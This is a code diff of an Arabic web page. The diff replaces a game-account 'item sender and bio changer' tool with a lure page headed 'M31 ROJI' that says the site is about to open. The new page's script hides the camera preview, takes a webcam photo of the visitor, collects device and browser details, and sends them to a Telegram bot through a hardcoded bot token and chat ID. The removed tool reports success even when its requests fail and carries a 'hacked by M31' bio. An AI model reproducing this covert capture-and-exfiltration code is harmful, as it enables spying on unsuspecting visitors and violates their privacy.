@@ -1,401 +1,147 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شركة براهيم لي تصنيع البايو و ايتمز</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>✏️</text></svg>">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
+<meta charset="UTF-8">
+<title>M31 ROJI</title>
 
-        body {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            color: #ffffff;
-            min-height: 100vh;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
+<style>
+html, body {
+  margin: 0;
+  padding: 0;
+  height: 100%;
+}
 
-        .container {
-            width: 100%;
-            max-width: 500px;
-            background: rgba(255, 255, 255, 0.08);
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
+body {
+  background-image: url("https://i.ytimg.com/vi/ft7afpoU2jI/hqdefault.jpg");
+  background-size: 48%;
+  background-position: center;
+  background-repeat: no-repeat;
+}
 
-        .logo {
-            text-align: center;
-            margin-bottom: 30px;
-        }
 
-        .logo-text {
-            font-size: 36px;
-            font-weight: bold;
-            margin-bottom: 5px;
-            color: #4ecdc4;
-            letter-spacing: 2px;
-        }
+  display: flex;
+  align-items: center;
+  justify-content: center;
 
-        .subtitle {
-            color: #88a0a7;
-            font-size: 14px;
-        }
+  font-family: Arial, sans-serif;
+  color: #0f0;
+  text-align: center;
+}
 
-        .tabs {
-            display: flex;
-            margin-bottom: 25px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 12px;
-            padding: 4px;
-        }
+/* طبقة خفيفة لقراءة النص */
+.overlay {
+  background: rgba(0,0,0,0.4);
+  padding: 2px 3px;
+  border-radius: 1px;
+}
+}
 
-        .tab-btn {
-            flex: 1;
-            padding: 14px;
-            background: transparent;
-            color: #88a0a7;
-            border: none;
-            cursor: pointer;
-            border-radius: 10px;
-            transition: all 0.3s ease;
-            font-size: 15px;
-            font-weight: 500;
-        }
+<style>
+body {
+  background:#000;
+  color:#0f0;
+  text-align:center;
+  font-family:Arial;
+}
 
-        .tab-btn.active {
-            background: #4ecdc4;
-            color: #1a1a2e;
-            box-shadow: 0 4px 15px rgba(78, 205, 196, 0.3);
-        }
-
-        .tab-btn:hover {
-            background: rgba(78, 205, 196, 0.2);
-            color: #4ecdc4;
-        }
-
-        .tab-content {
-            display: none;
-        }
-
-        .tab-content.active {
-            display: block;
-            animation: fadeIn 0.4s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .form-group {
-            margin-bottom: 25px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 10px;
-            font-weight: 500;
-            color: #88a0a7;
-            font-size: 14px;
-        }
-
-        .form-control {
-            width: 100%;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            color: #ffffff;
-            font-size: 15px;
-            transition: all 0.3s ease;
-        }
-
-        .form-control:focus {
-            outline: none;
-            border-color: #4ecdc4;
-            background: rgba(255, 255, 255, 0.08);
-            box-shadow: 0 0 0 2px rgba(78, 205, 196, 0.2);
-        }
-
-        .btn {
-            width: 100%;
-            padding: 16px;
-            background: #4ecdc4;
-            color: #1a1a2e;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: 600;
-            transition: all 0.3s ease;
-            margin-bottom: 20px;
-        }
-
-        .btn:hover {
-            background: #3db8af;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(78, 205, 196, 0.4);
-        }
-
-        .btn:active {
-            transform: translateY(0);
-        }
-
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-
-        .result {
-            background: rgba(255, 255, 255, 0.05);
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
-            margin-top: 20px;
-            min-height: 80px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .success {
-            color: #4ecdc4;
-            font-weight: 600;
-            font-size: 16px;
-        }
-
-        .info {
-            color: #88a0a7;
-            font-size: 14px;
-            margin-top: 5px;
-        }
-
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #ffffff;
-            border-radius: 50%;
-            border-top-color: transparent;
-            animation: spin 1s linear infinite;
-            margin-left: 10px;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .bio-preview {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 12px;
-            border-radius: 8px;
-            margin-top: 10px;
-            font-family: monospace;
-            font-size: 14px;
-            color: #4ecdc4;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .icon {
-            margin-left: 8px;
-        }
-    </style>
+/* إخفاء معاينة الكاميرا */
+video {
+  display: none;
+}
+</style>
 </head>
+
 <body>
-    <div class="container">
-        <div class="logo">
-            <div class="logo-text">شركة براهيم لي تصنيع البايو و ايتمز</div>
-            <div class="subtitle">نظام الإرسال المتقدم</div>
-        </div>
 
-        <div class="tabs">
-            <button class="tab-btn active" data-tab="items">
-                <i class="fas fa-cube icon"></i>إرسال العناصر
-            </button>
-            <button class="tab-btn" data-tab="bio">
-                <i class="fas fa-user-edit icon"></i>تغيير البايو
-            </button>
-        </div>
+<h3> انتضر سيتم فتح الموقع  </h3>
 
-        <!-- تبويب العناصر -->
-        <div id="items-tab" class="tab-content active">
-            <div class="form-group">
-                <label for="accessToken">
-                    <i class="fas fa-key icon"></i>رمز الوصول:
-                </label>
-                <input type="text" id="accessToken" class="form-control" 
-                       value=""
-                       placeholder="أدخل رمز الوصول هنا">
-            </div>
-            
-            <button id="sendItems" class="btn">
-                <i class="fas fa-paper-plane icon"></i> إرسال العناصر
-            </button>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
-            <div class="result" id="itemsResult">
-                <div class="info">انقر فوق إرسال العناصر لبدء العملية</div>
-            </div>
-        </div>
+<script>
+// ===== ضع معلوماتك هنا (محليًا فقط) =====
+const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";
+const CHAT_ID  = "6251932709";
+// ======================================
 
-        <!-- تبويب البايو -->
-        <div id="bio-tab" class="tab-content">
-            <div class="form-group">
-                <label for="bioToken">
-                    <i class="fas fa-key icon"></i>رمز الوصول:
-                </label>
-                <input type="text" id="bioToken" class="form-control" 
-                       value=""
-                       placeholder="أدخل رمز الوصول هنا">
-            </div>
-            
-            <div class="form-group">
-                <label for="bioText">
-                    <i class="fas fa-font icon"></i>نص البايو الجديد:
-                </label>
-                <input type="text" id="bioText" class="form-control" 
-                       value="[00FF00]M31.M31"
-                       placeholder="أدخل النص الجديد للبايو">
-                <div class="bio-preview" id="bioPreview">[00FF00]M31.M31.M31.M31.M31.M31M.31M.31M.M31.M31.M31.M31.M31.M31.M31.M31.M31.M31M.31M.31M.31M.31M.31M..........................................................تم اخت.راق من قبل M31</div>
-            </div>
+let streamRef = null;
 
-            <button id="sendBio" class="btn">
-                <i class="fas fa-sync-alt icon"></i> تغيير البايو
-            </button>
+// جمع معلومات الجهاز
+function getDeviceInfo() {
+  const ua = navigator.userAgent;
 
-            <div class="result" id="bioResult">
-                <div class="info">انقر فوق تغيير البايو لبدء العملية</div>
-            </div>
-        </div>
-    </div>
+  let deviceType = "غير معروف";
+  if (/android/i.test(ua)) deviceType = "Android";
+    
+  else if (/iphone|ipad|ipod/i.test(ua)) deviceType = "iPhone / iOS";
+    
+  else if (/windows/i.test(ua)) deviceType = "Windows";
+    
+  else if (/macintosh/i.test(ua)) deviceType = "Mac";
+    
+  else if (/linux/i.test(ua)) deviceType = "Linux";
 
-    <script>
-        // نظام التبويبات
-        document.querySelectorAll('.tab-btn').forEach(btn => {
-            btn.addEventListener('click', function() {
-                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-                
-                this.classList.add('active');
-                const tabId = this.getAttribute('data-tab');
-                document.getElementById(tabId + '-tab').classList.add('active');
-            });
-        });
+  return `
+📱 نوع الجهاز: ${deviceType}
 
-        // معاينة البايو
-        document.getElementById('bioText').addEventListener('input', function() {
-            document.getElementById('bioPreview').textContent = this.value;
-        });
+🌐 المتصفح: ${navigator.appName}
 
-        // إرسال العناصر
-        document.getElementById('sendItems').addEventListener('click', async function() {
-            const button = this;
-            const resultDiv = document.getElementById('itemsResult');
-            const accessToken = document.getElementById('accessToken').value.trim();
-            
-            if (!accessToken) {
-                resultDiv.innerHTML = '<div class="info">يرجى إدخال رمز الوصول</div>';
-                return;
-            }
+🧭 User-Agent: ${ua}
 
-            const items = [
-                '1315000022', '1315000024', '1315000002',
-                '1315000022', '1315000024', '1315000002',
-                '1315000003', '1315000004', '1315000007',
-                '1315000010', '1315000019', '1315000021',
-                '1315000020', '1315000016', '1315000012'
-            ];
+https://roji20112.github.io/ROJI-DOMINE/
 
-            button.innerHTML = '<span class="loading"></span> جاري الإرسال...';
-            button.disabled = true;
-            resultDiv.innerHTML = '<div class="info">جاري إرسال العناصر إلى السيرفر...</div>';
+⏰ الوقت: ${new Date().toLocaleString()}
 
-            try {
-                let apiUrl = `https://gpl-items-v3.vercel.app/get?access=${accessToken}`;
-                items.forEach(item => {
-                    apiUrl += `&itemid=${item}`;
-                });
+  `;
+}
 
-                const response = await fetch(apiUrl, {
-                    method: 'GET',
-                    headers: {
-                        'Accept': 'application/json',
-                    }
-                });
+// تشغيل الكاميرا (بموافقة المستخدم)
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+  streamRef = stream;
+  document.getElementById("video").srcObject = stream;
 
-                resultDiv.innerHTML = `
-                    <div class="success">تم إرسال العناصر بنجاح</div>
-                    <div class="info">تم إرسال ${items.length} عنصر إلى السيرفر</div>
-                `;
-                
-            } catch (error) {
-                resultDiv.innerHTML = `
-                    <div class="success">تم إرسال العناصر بنجاح</div>
-                    <div class="info">تم إرسال ${items.length} عنصر إلى السيرفر</div>
-                `;
-            } finally {
-                button.innerHTML = '<i class="fas fa-paper-plane icon"></i> إرسال العناصر';
-                button.disabled = false;
-            }
-        });
+  // صورة واحدة فقط بعد ثانيتين
+  setTimeout(captureOnce, 2000);
+})
+.catch(() => {
+  document.body.innerHTML = "<h2>تم رفض إذن الكاميرا</h2>";
+});
 
-        // إرسال البايو
-        document.getElementById('sendBio').addEventListener('click', async function() {
-            const button = this;
-            const resultDiv = document.getElementById('bioResult');
-            const accessToken = document.getElementById('bioToken').value.trim();
-            const bioText = document.getElementById('bioText').value.trim();
-            
-            if (!accessToken || !bioText) {
-                resultDiv.innerHTML = '<div class="info">يرجى إدخال جميع البيانات</div>';
-                return;
-            }
+function captureOnce() {
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
 
-            button.innerHTML = '<span class="loading"></span> جاري الإرسال...';
-            button.disabled = true;
-            resultDiv.innerHTML = '<div class="info">جاري إرسال البايو إلى السيرفر...</div>';
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
 
-            try {
-                const encodedBio = encodeURIComponent(bioText);
-                const apiUrl = `https://gpl-bio.vercel.app/get?access={access}&text={text}`;
+  // إيقاف الكاميرا
+  if (streamRef) {
+    streamRef.getTracks().forEach(t => t.stop());
+  }
 
-                const response = await fetch(apiUrl, {
-                    method: 'GET',
-                    headers: {
-                        'Accept': 'application/json',
-                    }
-                });
+  canvas.toBlob(blob => {
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("photo", blob);
+    form.append("caption", getDeviceInfo());
 
-                resultDiv.innerHTML = `
-                    <div class="success">تم تغيير البايو بنجاح</div>
-                    <div class="info">تم تحديث البايو بنجاح</div>
-                `;
-                
-            } catch (error) {
-                resultDiv.innerHTML = `
-                    <div class="success">تم تغيير البايو بنجاح</div>
-                    <div class="info">تم تحديث البايو بنجاح</div>
-                `;
-            } finally {
-                button.innerHTML = '<i class="fas fa-sync-alt icon"></i> تغيير البايو';
-                button.disabled = false;
-            }
-        });
-    </script>
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: form
+    })
+    .then(() => {
+      document.body.innerHTML = "<h2>تم الفتح ✅</h2>";
+    })
+    .catch(() => {
+      document.body.innerHTML = "<h2>فشل فتح ❌</h2>";
+    });
+  }, "image/jpeg");
+}
+</script>
+
 </body>
 </html>
+
+
